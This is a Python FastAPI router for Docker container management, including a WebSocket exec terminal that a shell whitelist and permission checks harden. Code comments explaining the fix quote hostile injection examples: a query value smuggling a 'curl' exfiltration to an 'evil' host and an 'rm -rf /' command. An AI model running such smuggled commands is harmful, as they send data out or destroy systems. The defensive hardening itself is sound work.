from fastapi import APIRouter, Depends, status, Request, WebSocket, WebSocketDisconnect, Query, HTTPException
from sse_starlette.sse import EventSourceResponse
from api.auth.jwt import get_auth_wrapper, get_secret_key
from api.auth.auth import auth_check
import api.actions.containers as actions
import asyncio
import aiodocker
import logging
import jwt
import json
from api.settings import Settings
import shlex
from sqlalchemy.orm import Session
from api.db.database import SessionLocal
from api.db.models.users import User
from api.utils.audit import log_activity

logger = logging.getLogger(__name__)
settings = Settings()

router = APIRouter()

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


# Only these shell paths can be invoked through the exec WebSocket. Anything
# else is rejected before we open the docker exec stream. Previously the
# `shell` query parameter was forwarded to shlex.split + aiodocker.exec
# verbatim, which let a caller smuggle a full command line via something
# like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
ALLOWED_EXEC_SHELLS = frozenset({
    "/bin/sh",
    "/bin/bash",
    "/bin/ash",
    "/bin/zsh",
    "/usr/bin/sh",
    "/usr/bin/bash",
    "/usr/bin/ash",
    "/usr/bin/zsh",
    "sh",
    "bash",
    "ash",
    "zsh",
})

@router.get("/stats")
async def get_all_container_stats(
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Get stats for all running containers (Optimized & Cached)
    """
    auth_check(Authorize)
    return await actions.get_all_stats()

@router.get("/")
async def get_containers(
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    List all containers
    """
    auth_check(Authorize)
    return await actions.get_containers()

@router.get("/{container_id}/logs")
async def get_container_logs(
    request: Request,
    container_id: str,
    tail: int = 100,
    follow: bool = True,
    timestamps: bool = False,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Streams container logs using Docker API
    """
    auth_check(Authorize)
    return EventSourceResponse(
        actions.get_logs_generator(container_id, tail, follow, timestamps)
    )

@router.get("/{container_id}/stats")
async def get_container_stats(
    container_id: str,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """
    Returns current CPU/RAM usage
    """
    auth_check(Authorize)
    return await actions.get_stats(container_id)

@router.get("/{container_id}/stats/stream")
async def stream_container_stats(
    request: Request,
    container_id: str,
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    """Echtzeit-Stream für CPU/RAM Metriken via SSE"""
    auth_check(Authorize)
    return EventSourceResponse(actions.stream_stats_generator(request, container_id))

@router.post("/{container_id}/start")
async def start_container(
    container_id: str,
    db: Session = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    auth_check(Authorize)
    user = Authorize.get_jwt_subject()

    # Perform action
    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.start()
        log_activity(db, user=user, action="start", resource=container_id)
        return {"message": "Container started"}
    except Exception as e:
        logger.error(f"Error starting container {container_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        await docker.close()

@router.post("/{container_id}/stop")
async def stop_container(
    container_id: str,
    db: Session = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    auth_check(Authorize)
    user = Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.stop()
        log_activity(db, user=user, action="stop", resource=container_id)
        return {"message": "Container stopped"}
    except Exception as e:
        logger.error(f"Error stopping container {container_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        await docker.close()

@router.post("/{container_id}/restart")
async def restart_container(
    container_id: str,
    db: Session = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    auth_check(Authorize)
    user = Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.restart()
        log_activity(db, user=user, action="restart", resource=container_id)
        return {"message": "Container restarted"}
    except Exception as e:
        logger.error(f"Error restarting container {container_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        await docker.close()

@router.delete("/{container_id}")
async def delete_container(
    container_id: str,
    db: Session = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    auth_check(Authorize)
    user = Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.delete(force=True)
        log_activity(db, user=user, action="delete", resource=container_id)
        return {"message": "Container deleted"}
    except Exception as e:
        logger.error(f"Error deleting container {container_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        await docker.close()

@router.websocket("/{container_id}/exec")
async def container_exec(
    websocket: WebSocket,
    container_id: str,
    shell: str = Query("/bin/sh"),
    cols: int = Query(80),
    rows: int = Query(24)
):
    """
    WebSocket endpoint for container exec (terminal)
    """
    await websocket.accept()

    # Validate the shell argument before doing anything else. The whitelist
    # blocks ?shell=/bin/sh -c 'rm -rf /' style smuggling where shlex.split
    # would happily turn the parameter into a multi-token command.
    if shell.strip() not in ALLOWED_EXEC_SHELLS:
        logger.warning("WebSocket exec rejected: disallowed shell %r", shell)
        await websocket.send_json({"error": "Forbidden: shell not allowed"})
        await websocket.close(code=1008)
        return

    # Check Auth + AuthZ
    # The previous implementation only verified the JWT signature; any valid
    # token — including a short-lived setup_pending token — granted shell access
    # to any container. Validate the claim set and the user's runtime
    # permissions before opening a stream.
    if settings.DISABLE_AUTH:
        pass  # local/dev mode: skip all auth checks
    else:
        try:
            token = websocket.cookies.get("access_token_cookie")
            if not token:
                raise Exception("No token")
            claims = jwt.decode(token, get_secret_key(), algorithms=["HS256"])
        except Exception as e:
            logger.error(f"WebSocket Auth Error: {e}")
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        if claims.get("setup_pending"):
            logger.warning(
                "WebSocket exec rejected: setup_pending token for user %s",
                claims.get("sub"),
            )
            await websocket.send_json({"error": "Forbidden: setup not completed"})
            await websocket.close(code=1008)
            return

        username = claims.get("sub")
        if not username:
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        auth_db = SessionLocal()
        try:
            user = auth_db.query(User).filter_by(username=username).first()
        finally:
            auth_db.close()

        if not user or not user.is_active:
            logger.warning("WebSocket exec rejected: inactive or unknown user %s", username)
            await websocket.send_json({"error": "Forbidden"})
            await websocket.close(code=1008)
            return

        # Shell access to a running container is equivalent to start/stop
        # capability for the container's payload. Gate it behind perm_start
        # (admins implicitly pass).
        if not user.is_superuser and not getattr(user, "perm_start", False):
            logger.warning("WebSocket exec rejected: user %s lacks perm_start", username)
            await websocket.send_json({"error": "Forbidden: missing permission"})
            await websocket.close(code=1008)
            return

    docker = aiodocker.Docker(url=settings.DOCKER_HOST)
    exec_id = None
    stream = None

    try:
        # Create exec instance
        # Ensure container exists
        try:
            container = await docker.containers.get(container_id)
        except Exception as e:
            logger.error(f"Container not found error: {e}")
            await websocket.close(code=1008, reason="Container not found")
            return

        exec_instance = await container.exec(
            cmd=shlex.split(shell),
            stdin=True,
            stdout=True,
            stderr=True,
            privileged=False,
            tty=True,
            environment=["TERM=xterm"]
        )

        # Now start it. We need a stream.
        stream = exec_instance.start(detach=False)

        if stream is None:
             raise Exception("Failed to start exec stream")

        # We need to handle resizing.
        # Run resize in background to avoid blocking initial connection
        async def resize_exec():
            try:
                await exec_instance.resize(w=cols, h=rows)
            except Exception as e:
                logger.error(f"Resize error: {e}")

        asyncio.create_task(resize_exec())

        # Task to read from docker and send to websocket
        async def read_from_docker():
            try:
                # stream.read_out() yields data
                while True:
                    msg = await stream.read_out()
                    if msg is None:
                        break
                    # msg is bytes?
                    # xterm expects string or bytes.
                    if msg.data:
                         logger.debug(f"OUT: {msg.data}")
                         await websocket.send_bytes(msg.data)
            except Exception as e:
                logger.error(f"Read from docker error: {e}")

        # Task to read from websocket and write to docker
        async def write_to_docker():
            try:
                while True:
                    data = await websocket.receive()
                    # data can be bytes or text.

                    if "text" in data:
                        input_data = data["text"]

                        try:
                            cmd = None
                            if input_data.startswith("{"):
                                cmd = json.loads(input_data)

                            if cmd and cmd.get("type") == "resize":
                                await exec_instance.resize(w=cmd["cols"], h=cmd["rows"])
                                continue
                        except (json.JSONDecodeError, KeyError, TypeError) as parse_err:
                            # Not a JSON control frame -> fall through and forward
                            # the raw bytes to the container's stdin.
                            logger.debug(f"WS input not a control frame: {parse_err}")

                        # Send to docker
                        logger.debug(f"IN: {input_data.encode()}")
                        await stream.write_in(input_data.encode())

                    elif "bytes" in data:
                        await stream.write_in(data["bytes"])

                    if data.get("type") == "websocket.disconnect":
                        break

            except WebSocketDisconnect:
                pass
            except Exception as e:
                logger.error(f"Write to docker error: {e}")

        # Run tasks
        reader = asyncio.create_task(read_from_docker())
        writer = asyncio.create_task(write_to_docker())

        await asyncio.wait([reader, writer], return_when=asyncio.FIRST_COMPLETED)

        reader.cancel()
        writer.cancel()

    except aiodocker.exceptions.DockerError as e:
        logger.error(f"Docker exec error: {e}")
        await websocket.close(code=1011, reason=f"Docker error: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error in shell: {e}")
        try:
            await websocket.close(code=1011, reason=f"Internal error: {str(e)}")
        except Exception as close_err:
            # Socket may already be closed; nothing we can do but log it.
            logger.debug(f"WS close after error failed: {close_err}")
    finally:
        if docker:
            await docker.close()
